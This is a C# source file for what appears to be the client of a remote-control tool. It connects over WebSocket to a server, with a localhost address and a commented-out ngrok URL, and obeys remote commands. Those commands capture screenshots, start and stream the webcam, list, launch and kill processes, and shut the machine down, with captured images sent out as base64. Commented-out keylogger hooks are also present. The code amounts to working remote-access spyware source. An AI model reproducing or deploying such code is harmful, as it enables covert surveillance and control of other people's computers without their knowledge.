//using System;
//using System.Diagnostics;
//using System.Drawing;
//using System.Drawing.Imaging;
//using System.IO;
//using KeyLogger;
//using Microsoft.VisualBasic.Logging;
using System.Diagnostics;
using System.Drawing.Imaging;

//using System.DirectoryServices.ActiveDirectory;

//using System.Threading;
//using System.Threading.Tasks;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
//using System.Xml.Linq;
//using static System.Net.Mime.MediaTypeNames;

class Program
{
    static ClientWebSocket ws = new ClientWebSocket();

    static Webcam webcam = new Webcam();
    static bool webcamRunning = false;


    //static KeylogController kl = new KeylogController();

    static async Task Main(string[] args)
    {
        Console.WriteLine("Starting client...");

        await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);
        //await ws.ConnectAsync(new Uri("wss://abigail-conciliable-hyun.ngrok-free.dev/ws/"), CancellationToken.None);
    

        // REGISTER
        await Send(new
        {
            type = "register",
            clientType = "desktop",
            name = Environment.MachineName
        });

        Console.WriteLine("Connected to server");

        await ReceiveLoop();
    }

    // ================= RECEIVE =================
    static async Task ReceiveLoop()
    {
        var buffer = new byte[8192];

        while (ws.State == WebSocketState.Open)
        {
            var ms = new MemoryStream();
            WebSocketReceiveResult result;

            do
            {
                result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                ms.Write(buffer, 0, result.Count);
            }
            while (!result.EndOfMessage);

            if (result.MessageType == WebSocketMessageType.Text)
            {
                var json = Encoding.UTF8.GetString(ms.ToArray());
                HandleCommand(json);
            }
        }
    }

    // ================= HANDLE =================
    static void HandleCommand(string json)
    {
        using JsonDocument doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        if (!root.TryGetProperty("type", out var typeProp) || typeProp.GetString() != "command")
            return;

        string from = root.GetProperty("from").GetString();
        string command = root.GetProperty("command").GetString().ToUpper();

        //// ================= NORMAL COMMAND =================
        switch (command)
        {
            //case "KEYLOG":
            //    kl.Start();
            //    break;

            //case "HOOK":
            //    kl.Hook();
            //    break;

            //case "UNHOOK":
            //    kl.Unhook();
            //    break;

            //case "PRINT":
            //    sendText(from, command.ToLower(), kl.PrintKeys());
            //    break;

            //case "EXIT":
            //    kl.Stop();
            //    break;

            case "SCREENSHOT-TAKE":
                sendImage(from, take());
                break;

            case "REGISTRY":
                //registry();
                break;

            case "PROCESS-LIST":
                listProcess(from);
                break;

            case "PROCESS-KILL":
                string pid = root.GetProperty("pid").GetString();
                sendText(from, command.ToLower(), killProcess(pid));
                break;

            case "PROCESS-START":
                string pn = root.GetProperty("pn").GetString();
                sendText(from, command.ToLower(), startProcess(pn));
                break;

            case "APP-LIST":
                listApp(from);
                break;

            case "APP-KILL":
                string aid = root.GetProperty("aid").GetString();
                sendText(from, command.ToLower(), killApp(aid));
                break;

            case "APP-START":
                string an = root.GetProperty("an").GetString();
                sendText(from, command.ToLower(), startApp(an));
                break;

            case "SHUTDOWN":
                shutdown();
                break;

            case "WEBCAM-START":
                webcam.Start();
                webcamRunning = true;
                break;

            case "WEBCAM-GET":
                if (webcamRunning)
                    sendImage(from, webcam.GetFrame());
                break;

            case "WEBCAM-STREAM":
                _ = StreamWebcam(from);
                break;

            case "WEBCAM-STOP":
                webcam.Stop();
                webcamRunning = false;
                break;

            default:
                return;
        }

        // ================= KEYLOG MODE =================
        //if (keylogMode)
        //{
        //    switch (command)
        //    {
        //        case "HOOK":
        //            kl.Hook();
        //            Console.WriteLine("Enter keylog mode");
        //            break;

        //        case "UNHOOK":
        //            kl.Unhook();
        //            break;

        //        case "PRINT":
        //            kl.PrintKeys();
        //            break;

        //        case "EXIT":
        //            kl.Stop();
        //            keylogMode = false;
        //            Console.WriteLine("Exit keylog mode");
        //            break;
        //    }

        //    return; // ⚠️ IMPORTANT: stop here
        //}


    }

    // ================= SEND =================
    static async Task Send(object obj)
    {
        var json = JsonSerializer.Serialize(obj);
        var bytes = Encoding.UTF8.GetBytes(json);

        await ws.SendAsync(new ArraySegment<byte>(bytes),
            WebSocketMessageType.Text,
            true,
            CancellationToken.None);
    }

    static async void sendText(string target, string commands, string text)
    {
        //string base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));

        await Send(new
        {
            type = "response",
            from = Environment.MachineName,
            to = target,
            command = commands,
            data = text
        });
    }

    static async void sendImage(string target, byte[] data)
    {
        string base64 = Convert.ToBase64String(data);

        await Send(new
        {
            type = "response",
            from = Environment.MachineName,
            to = target,
            data = base64
        });
    }


    //// ================= FEATURES =================

    static async void listProcess(string target)
    {
        var processes = getProcess();

        await Send(new
        {
            type = "response",
            from = Environment.MachineName,
            to = target,
            data = processes
        });
    }

    static object[][] getProcess()
    {
        var pr = Process.GetProcesses();
        object[][] result = new object[pr.Length][];

        for (int i = 0; i < pr.Length; i++)
        {
            result[i] = new object[]
            {
                pr[i].ProcessName,
                pr[i].Id,
                pr[i].Threads.Count
            };
        }

        return result;
    }

    static string startProcess(string pn)
    {
        string processName = pn + ".exe";
        try
        {
            Process.Start(processName);
            return "Process started";
        }
        catch (Exception ex)
        {
            return "Some error happens";
        }
    }

    static string killProcess(string pid)
    {
        var pr = Process.GetProcesses();
        foreach (System.Diagnostics.Process p in pr)
        {
            if (p.Id.ToString() == pid)
            {
                try
                {
                    p.Kill();
                    return "Process is killed";
                }
                catch (Exception ex)
                {
                    return "Some error happen";
                }
            }
        }
        return $"PID: {pid} is not exist";
    }

    static async void listApp(string target)
    {
        var apps = getApp();

        await Send(new
        {
            type = "response",
            from = Environment.MachineName,
            to = target,
            data = apps
        });
    }

    static object[][] getApp()
    {
        var pr = Process.GetProcesses();
        object[][] result = new object[pr.Length][];

        bool flag = false;
        int i = 0; 

        foreach (System.Diagnostics.Process p in pr)
        {
            if (p.MainWindowTitle.Length > 0)
            {
                flag = true;
            }

            if (flag)
            {
                result[i] = new object[]
                {
                    p.ProcessName,
                    p.Id,
                    p.Threads.Count
                };
                i++;
            }
        }

        return result;
    }

    static string startApp(string an)
    {
        string appName = an + ".exe";
        try
        {
            Process.Start(appName);
            return "Application started";
        }
        catch (Exception ex)
        {
            return "Some error happens";
        }
    }

    static string killApp(string aid)
    {
        var pr = Process.GetProcesses();
        foreach (System.Diagnostics.Process p in pr)
        {
            if (p.MainWindowTitle.Length > 0)
            {
                if (p.Id.ToString() == aid)
                {
                    try
                    {
                        p.Kill();
                        return "Application is killed";
                    }
                    catch (Exception ex)
                    {
                        return "Some error happens";
                    }
                }
            }
        }
        return $"Application with ID: {aid} is not exist";
    }

    static byte[] take()
    {
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
        {
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, ImageFormat.Jpeg);
                return ms.ToArray();
            }
        }
    }

    static async Task StreamWebcam(string to)
    {
        while (webcamRunning)
        {
            var frame = webcam.GetFrame();

            if (frame != null)
            {
                sendImage(to, frame);
            }

            await Task.Delay(100); // ~50 FPS
        }
    }

    //static void hook(ref Thread tklog)
    //{
    //    String s = "";
    //    tklog.Start();
    //    //File.WriteAllText(appstart.path, "");
    //}

    //static void unhook(ref Thread tklog)
    //{
    //    tklog.Suspend();
    //}

    //static string printKey()
    //{
    //    String s = "";
    //    s = File.ReadAllText(appstart.path);
    //    //File.WriteAllText(appstart.path, "");

    //    if (s == "")
    //        s = "\0";

    //    return s;
    //}

    static void shutdown()
    {
        System.Diagnostics.Process.Start("ShutDown", "-s");
    }
}